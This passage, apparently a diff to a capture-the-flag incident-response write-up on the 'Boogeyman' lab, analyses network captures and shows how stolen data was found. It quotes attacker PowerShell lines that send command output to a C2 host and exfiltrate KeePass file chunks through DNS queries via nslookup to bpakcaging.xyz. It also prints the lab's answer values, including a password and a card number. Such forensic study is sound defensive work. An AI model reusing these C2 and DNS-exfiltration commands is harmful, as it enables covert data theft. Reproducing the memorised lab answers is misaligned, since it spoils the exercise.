@@ -359,3 +359,177 @@ Main lesson:
 As an incident responder, follow the chain from email headers → attachment → LNK payload → PowerShell logs → downloaded tools → accessed files → exfiltration method.
 ```
 ---
+## Short Note: Network Traffic & Exfiltration Analysis
+
+In this section, we confirmed the full impact of the Boogeyman attack by analyzing **PCAP traffic**, **HTTP streams**, **DNS queries**, and the exfiltrated KeePass file.
+
+---
+
+### 1. Payload server software
+
+Answer:
+
+```text
+python
+```
+
+How I found it:
+
+In Wireshark, I followed the HTTP stream for the payload download:
+
+```text
+GET /sq3.exe HTTP/1.1
+Host: files.bpakcaging.xyz
+```
+
+The response header showed:
+
+```http
+Server: SimpleHTTP/0.6 Python/3.10.7
+```
+
+Why it matters:
+
+```text
+The attacker hosted payloads using Python's built-in HTTP server.
+```
+
+---
+
+### 2. HTTP method used for C2 command output
+
+Answer:
+
+```text
+POST
+```
+
+How I found it:
+
+From the PowerShell C2 code:
+
+```powershell
+Invoke-WebRequest -Uri $p$s/27fe2489 -Method POST
+```
+
+Why it matters:
+
+```text
+GET was used to receive commands.
+POST was used to send command output back to the C2.
+```
+
+---
+
+### 3. Exfiltration protocol
+
+Answer:
+
+```text
+dns
+```
+
+How I found it:
+
+The attacker used:
+
+```powershell
+nslookup -q=A "$line.bpakcaging.xyz" $destination
+```
+
+Why it matters:
+
+```text
+The attacker hid stolen file chunks inside DNS queries.
+```
+
+---
+
+### 4. Password of the exfiltrated KeePass file
+
+Answer:
+
+```text
+%p9^3!lL^Mz47E2GaT^y
+```
+
+How I found it:
+
+The attacker used `sq3.exe` to read the Microsoft Sticky Notes database:
+
+```text
+plum.sqlite
+```
+
+The Sticky Notes output contained:
+
+```text
+Master Password
+%p9^3!lL^Mz47E2GaT^y
+```
+
+Why it matters:
+
+```text
+This password was used to unlock the exfiltrated KeePass database.
+```
+
+---
+
+### 5. Credit card number inside the exfiltrated file
+
+Answer:
+
+```text
+4024007128269551
+```
+
+How I found it:
+
+The attacker exfiltrated:
+
+```text
+protected_data.kdbx
+```
+
+The file was sent through DNS as hex chunks. After rebuilding it, the file had one extra byte at the beginning:
+
+```text
+cd 03 d9 a2 9a 67 fb 4b ...
+```
+
+A valid KeePass file should start with:
+
+```text
+03 d9 a2 9a 67 fb 4b b5
+```
+
+So I fixed it by removing the first byte:
+
+```bash
+cp protected_data.kdbx protected_data_corrupt.kdbx
+dd if=protected_data_corrupt.kdbx of=protected_data_fixed.kdbx bs=1 skip=1
+```
+
+Then I opened `protected_data_fixed.kdbx` with KeePass using the password from Sticky Notes and found the credit card number.
+
+---
+
+## Main Attack Flow
+
+```text
+Attacker hosted tools with Python SimpleHTTP server
+→ victim downloaded tools via PowerShell
+→ C2 used GET to send commands
+→ C2 used POST to receive command output
+→ attacker found KeePass password in Sticky Notes
+→ attacker read protected_data.kdbx
+→ converted file data to hex
+→ exfiltrated it using DNS queries with nslookup
+→ rebuilt KeePass file from DNS traffic
+→ opened it and found stored credit card data
+```
+
+Main lesson: network traffic can reveal both **attacker infrastructure** and **stolen data**, especially when you combine PowerShell logs with HTTP/DNS packet analysis.
+---
+![keepass](keepass.png)
